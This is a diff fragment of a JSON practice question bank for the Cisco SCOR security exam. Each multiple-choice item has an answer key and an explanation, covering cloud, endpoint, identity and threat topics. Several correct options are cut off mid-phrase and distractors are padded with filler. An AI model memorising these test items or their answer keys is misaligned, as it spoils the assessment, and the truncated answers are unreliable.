+          "Change the office SSID without additional tooling in most production environments"
+        ],
+        "correct": 0,
+        "explanation": "Tunnel bring-up failures are usually IKE proposal mismatch, identity/PSK/cert issues or routing; check logs/debugs for Phase 1 vs Phase 2.",
+        "difficulty": "Hard",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "2.10"
+      },
+      {
+        "question": "In the Cloud Shared Responsibility Model for IaaS, who typically hardens the guest OS?",
+        "options": [
+          "The customer",
+          "Only the cloud provider",
+          "Nobody without additional tooling",
+          "The ISP"
+        ],
+        "correct": 0,
+        "explanation": "In IaaS the provider secures the hypervisor and facility; the customer is responsible for the guest OS, apps and data.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "3.1"
+      },
+      {
+        "question": "What is Cisco Secure Workload (formerly Tetration) mainly used for?",
+        "options": [
+          "Workload microsegmentation and visibility based on observed application flows",
+          "Guest Wi-Fi splash pages according to common practice",
+          "Cable certification without additional tooling during routine maintenance windows",
+          "Email signatures according to common practice when no other controls exist"
+        ],
+        "correct": 0,
+        "explanation": "Secure Workload maps application dependencies and enforces microsegmentation policies on workloads across data center and cloud.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "3.4"
+      },
+      {
+        "question": "Why might a SCOR-level design send cloud security logs into Splunk?",
+        "options": [
+          "To centralize monitoring and correlation across cloud and on-prem sources",
+          "To delete cloud logs automatically for day-to-day operations",
+          "To replace IAM in typical enterprise networks according to common practice",
+          "To assign private IPs for day-to-day operations"
+        ],
+        "correct": 0,
+        "explanation": "Ingesting cloud logs into Splunk (or similar SIEM) enables unified detection and investigation across hybrid estates.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "logs-ir",
+        "domain": "3.5"
+      },
+      {
+        "question": "What is eBPF commonly used for in modern workload security?",
+        "options": [
+          "Safe, programmable kernel-level observability and policy without loading classic modules",
+          "Replacing TLS certificates across mixed vendor fleets during routine maintenance windows",
+          "Assigning VLANs on access switches according to common practice",
+          "Drawing network diagrams in typical enterprise networks"
+        ],
+        "correct": 0,
+        "explanation": "eBPF runs sandboxed programs in the kernel for high-performance observability and security policy on modern Linux workloads.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "3.6"
+      },
+      {
+        "question": "What does Infrastructure as Code (IaC) security focus on in DevSecOps?",
+        "options": [
+          "Scanning templates and pipelines for misconfigurations before deployment",
+          "Painting server racks in typical enterprise networks",
+          "Choosing desk chairs according to common practice across mixed vendor fleets",
+          "Setting monitor brightness without additional tooling"
+        ],
+        "correct": 0,
+        "explanation": "IaC security scans Terraform/CloudFormation/etc. and CI pipelines for insecure defaults before infrastructure is deployed.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "risco",
+        "domain": "3.7"
+      },
+      {
+        "question": "How does Security Service Edge (SSE) differ from the broader SASE concept?",
+        "options": [
+          "SSE is the security services (SWG, CASB, ZTNA)",
+          "SSE is only a firewall; SASE is only Wi-Fi",
+          "They are identical marketing terms with no technical difference",
+          "SSE replaces Ethernet entirely in typical enterprise networks"
+        ],
+        "correct": 0,
+        "explanation": "SSE covers cloud-delivered security (SWG, CASB, ZTNA, FWaaS); SASE combines those with WAN networking (typically SD-WAN).",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "4.1"
+      },
+      {
+        "question": "What does Cisco Secure Access Secure Internet Access primarily protect?",
+        "options": [
+          "Users' access to the public internet with cloud-delivered security controls",
+          "Only east-west traffic inside a single rack in most production environments",
+          "Only serial console ports in most production environments",
+          "Only undersea cables across mixed vendor fleets"
+        ],
+        "correct": 0,
+        "explanation": "Secure Internet Access applies SWG/CASB-style controls to users browsing the public internet via Cisco Secure Access.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "4.2"
+      },
+      {
+        "question": "What is Secure Private Access (SPA) in Cisco Secure Access mainly about?",
+        "options": [
+          "Zero-trust access to private applications without exposing the whole network",
+          "Opening every port on the firewall during routine maintenance windows",
+          "Disabling MFA for day-to-day operations according to common practice",
+          "Bridging all VLANs together across mixed vendor fleets in most production environments"
+        ],
+        "correct": 0,
+        "explanation": "SPA provides ZTNA-style access to specific private apps, reducing the need to put users on the full corporate network.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "4.3"
+      },
+      {
+        "question": "Why configure DLP and AI guardrails on Secure Internet Access?",
+        "options": [
+          "To stop sensitive data leaving and constrain risky AI tool usage",
+          "To increase download speed according to common practice",
+          "To assign IP addresses according to common practice",
+          "To reboot access points nightly during routine maintenance windows"
+        ],
+        "correct": 0,
+        "explanation": "DLP prevents sensitive data exfiltration via web/SaaS; AI guardrails limit risky prompts or destinations for generative AI tools.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "4.4"
+      },
+      {
+        "question": "What do Cisco Secure Access Investigate scores help an analyst understand?",
+        "options": [
+          "How risky a destination or domain appears based on threat intelligence",
+          "The physical temperature of a router across mixed vendor fleets",
+          "The length of a patch cable according to common practice",
+          "The brightness of a LED in typical enterprise networks during routine maintenance windows"
+        ],
+        "correct": 0,
+        "explanation": "Investigate scores summarize threat intel risk for domains/destinations so analysts can prioritize blocks and investigations.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "logs-ir",
+        "domain": "4.5"
+      },
+      {
+        "question": "How do EPP and EDR mainly differ?",
+        "options": [
+          "EPP focuses on prevention",
+          "EPP only encrypts disks; EDR only prints logs",
+          "They are the same acronym in most production environments",
+          "EDR replaces the need for any network firewall"
+        ],
+        "correct": 0,
+        "explanation": "Endpoint Protection Platforms emphasize prevention (AV/AV); EDR adds telemetry, detection, investigation and response capabilities.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.1"
+      },
+      {
+        "question": "What is endpoint posture assessment used for before granting network access?",
+        "options": [
+          "Checking whether the device meets security requirements (patches",
+          "Measuring the user's typing speed in most production environments",
+          "Counting open browser tabs in typical enterprise networks",
+          "Choosing a desktop wallpaper when no other controls exist"
+        ],
+        "correct": 0,
+        "explanation": "Posture assessment verifies device health (updates, encryption, AV status) and can quarantine non-compliant devices.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.3"
+      },
+      {
+        "question": "What is Cisco Secure Malware Analytics (Threat Grid) mainly used for?",
+        "options": [
+          "Sandbox detonation and malware analysis with threat intelligence",
+          "Assigning OSPF process IDs across mixed vendor fleets",
+          "Drawing floor plans in most production environments without additional tooling",
+          "Configuring PoE budgets when no other controls exist"
+        ],
+        "correct": 0,
+        "explanation": "Secure Malware Analytics detonates and analyses samples in a sandbox and enriches results with threat intelligence.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.4"
+      },
+      {
+        "question": "When configuring Cisco Secure Endpoint, what is a primary goal?",
+        "options": [
+          "Deploy the connector and policies to prevent and detect malware on hosts",
+          "Replace the core switch in most production environments",
+          "Disable all USB ports forever without policy in typical enterprise networks",
+          "Turn off cloud analytics always in most production environments"
+        ],
+        "correct": 0,
+        "explanation": "Secure Endpoint deploys connectors and policies for prevention, detection and response against malware on endpoints.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.5"
+      },
+      {
+        "question": "An analyst reviews a Cisco Secure Endpoint malware detection event. What should they examine first?",
+        "options": [
+          "File hash, path, process lineage and disposition to decide isolation or allow",
+          "Only the laptop colour in most production environments without additional tooling",
+          "Only the user's favourite font across mixed vendor fleets",
+          "Only the DHCP lease time during routine maintenance windows"
+        ],
+        "correct": 0,
+        "explanation": "Detection events include hash, path, parent process and disposition; those guide whether to isolate, remediate or tune a false positive.",
+        "difficulty": "Hard",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.6"
+      },
+      {
+        "question": "What does Cisco Security Email Threat Defense mainly protect against?",
+        "options": [
+          "Malicious and phishing email threats with detection and remediation",
+          "Layer-2 loops without additional tooling",
+          "PoE overload for day-to-day operations during routine maintenance windows",
+          "DNS TTL mismatches across mixed vendor fleets"
+        ],
+        "correct": 0,
+        "explanation": "Email Threat Defense focuses on detecting and remediating phishing and malware delivered by email.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.7"
+      },
+      {
+        "question": "In Cisco ISE, what does profiling mainly help with?",
+        "options": [
+          "Identifying device types so policy can treat printers",
+          "Increasing Wi-Fi transmit power for day-to-day operations",
+          "Compressing NetFlow across mixed vendor fleets",
+          "Choosing rack colours in typical enterprise networks"
+        ],
+        "correct": 0,
+        "explanation": "ISE profiling classifies endpoints (printer, IP phone, PC) from network probes so authorization policies can be device-aware.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.1"
+      },
+      {
+        "question": "What does device compliance checking typically verify before full network access?",
+        "options": [
+          "Whether the endpoint meets security posture requirements",
+          "Whether the user likes the wallpaper",
+          "Whether the desk is adjustable according to common practice",
+          "Whether the mouse is wireless without additional tooling"
+        ],
+        "correct": 0,
+        "explanation": "Compliance/posture checks confirm patches, disk encryption, AV and similar controls before granting full access.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.2"
+      },
+      {
+        "question": "What does MAB (MAC Authentication Bypass) provide when 802.1X is not possible?",
+        "options": [
+          "Fallback authentication using the device MAC address",
+          "Full mutual certificate authentication",
+          "Encrypted DNS only without additional tooling",
+          "Automatic BGP peering in typical enterprise networks"
+        ],
+        "correct": 0,
+        "explanation": "MAB authenticates endpoints that cannot do 802.1X (printers, some IoT) by their MAC address, usually with limited access.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.3"
+      },
+      {
+        "question": "What is Change of Authorization (CoA) used for with ISE?",
+        "options": [
+          "Dynamically changing a session's authorization (e.g. quarantine) without waiting for re-login",
+          "Changing the device hostname overnight across mixed vendor fleets during routine maintenance windows",
+          "Rotating rack PDU phases for day-to-day operations across mixed vendor fleets",
+          "Updating the wall colour during routine maintenance windows for day-to-day operations"
+        ],
+        "correct": 0,
+        "explanation": "CoA lets ISE push a new authorization state mid-session, such as quarantining a non-compliant host.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.4"
+      },
+      {
+        "question": "Which technique tunnels data inside DNS queries to bypass typical firewalls?",
+        "options": [
+          "DNS tunneling",
+          "STP root guard",
+          "Port security sticky MAC",
+          "LLDP-MED"
+        ],
+        "correct": 0,
+        "explanation": "DNS tunneling encodes data in DNS queries/responses, often allowed through firewalls, for C2 or exfiltration.",
+        "difficulty": "Hard",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "6.5"
+      },
+      {
+        "question": "What do Cisco XDR and Splunk-style SIEM/SOAR platforms mainly provide together?",
+        "options": [
+          "Cross-domain detection",
+          "Only cable management",
+          "Only PoE budgeting in most production environments",
+          "Only Wi-Fi channel planning"
+        ],
+        "correct": 0,
+        "explanation": "XDR correlates multi-domain telemetry; SIEM/SOAR platforms like Splunk add search, detection content and automated response.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "logs-ir",
+        "domain": "6.6"
+      },
+      {
+        "question": "In a zero-trust design, what does Cisco Duo Device Trust mainly verify?",
+        "options": [
+          "That the authenticating device is a managed",
+          "That the Ethernet cable is Cat6",
+          "That the monitor supports 4K without additional tooling",
+          "That the chair has lumbar support"
+        ],
+        "correct": 0,
+        "explanation": "Duo Device Trust checks device health/management state as part of adaptive access decisions in a zero-trust architecture.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.7"
+      },
+      {
+        "question": "What does Duo Trust Monitor help security teams notice?",
+        "options": [
+          "Unusual authentication patterns that may indicate account takeover",
+          "The temperature of the UPS during routine maintenance windows",
+          "The length of fiber runs in typical enterprise networks in most production environments",
+          "The number of patch panels in typical enterprise networks"
+        ],
+        "correct": 0,
+        "explanation": "Trust Monitor highlights anomalous authentications (new location, impossible travel, new device) that may signal account compromise.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.7"
+      },
+      {
+        "question": "How does Splunk help manage and automate security events in a SCOR-aligned SOC?",
+        "options": [
+          "Search, correlate and trigger response actions on security data at scale",
+          "Replace all firewalls with search queries for day-to-day operations",
+          "Assign OSPF areas across mixed vendor fleets for day-to-day operations",
+          "Configure EtherChannel only during routine maintenance windows without additional tooling"
+        ],
+        "correct": 0,
+        "explanation": "Splunk ingests and searches security data at scale and, with SOAR/automation, can trigger response actions from detections.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "logs-ir",
+        "domain": "6.8"
+      },
+      {
+        "question": "Which OWASP-related issue involves tricking a user's browser into making unwanted authenticated requests?",
+        "options": [
+          "Cross-site request forgery (CSRF)",
+          "SQL injection only",
+          "ARP spoofing during routine maintenance windows",
+          "STP attack without additional tooling"
+        ],
+        "correct": 0,
+        "explanation": "CSRF abuses the browser's authenticated session to make the victim's browser send unintended state-changing requests.",
+        "difficulty": "Hard",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "Which control best reduces successful phishing clicks?",
+        "options": [
+          "User awareness training plus MFA and email threat defense",
+          "Disabling all email during routine maintenance windows",
+          "Removing DNS across mixed vendor fleets according to common practice",
+          "Turning off all logging without additional tooling"
+        ],
+        "correct": 0,
+        "explanation": "Layered anti-phishing controls combine awareness training, MFA (limits credential reuse impact) and email security filtering.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.4"
+      },
+      {
+        "question": "What does security intelligence sharing mainly enable between organisations?",
+        "options": [
+          "Faster recognition of known bad indicators across peers",
+          "Slower patch cycles during routine maintenance windows",
+          "Open admin shares during routine maintenance windows",
+          "Disabled TLS in most production environments according to common practice"
+        ],
+        "correct": 0,
+        "explanation": "Sharing threat intelligence (IoCs, TTPs) lets peers block and detect known bad activity faster than working in isolation.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "risco",
+        "domain": "1.7"
+      },
+      {
+        "question": "What does Duo Adaptive Access mainly adjust based on risk signals?",
+        "options": [
+          "Authentication requirements such as step-up MFA or block",
+          "The STP root priority in typical enterprise networks",
+          "The OSPF hello timer during routine maintenance windows",
+          "The PoE power class without additional tooling in most production environments"
+        ],
+        "correct": 0,
+        "explanation": "Adaptive Access policies raise or lower authentication strength (or deny) based on risk signals like new device or unusual location.",
+        "difficulty": "Hard",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.7"
+      },
+      {
+        "question": "What is Cisco Security Cloud Control used for in managing security devices?",
+        "options": [
+          "Centralised cloud management of multiple security devices and policies",
+          "Only drawing rack diagrams across mixed vendor fleets when no other controls exist",
+          "Only selling cables during routine maintenance windows",
+          "Only configuring analog modems when no other controls exist"
+        ],
+        "correct": 0,
+        "explanation": "Security Cloud Control (formerly CDO) provides centralised cloud-based management across multiple Cisco security devices.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "2.4"
+      },
+      {
+        "question": "Why is HTTPS a common exfiltration channel?",
+        "options": [
+          "It is widely allowed and its encrypted payload hides content from simple inspection",
+          "It is always blocked by default when no other controls exist",
+          "It cannot carry files when no other controls exist according to common practice",
+          "It only works on printers in most production environments for day-to-day operations"
+        ],
+        "correct": 0,
+        "explanation": "HTTPS is usually permitted outbound and encryption conceals what is being transferred unless TLS inspection or endpoint DLP is in place.",
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "6.5"
       }
     ]
   }
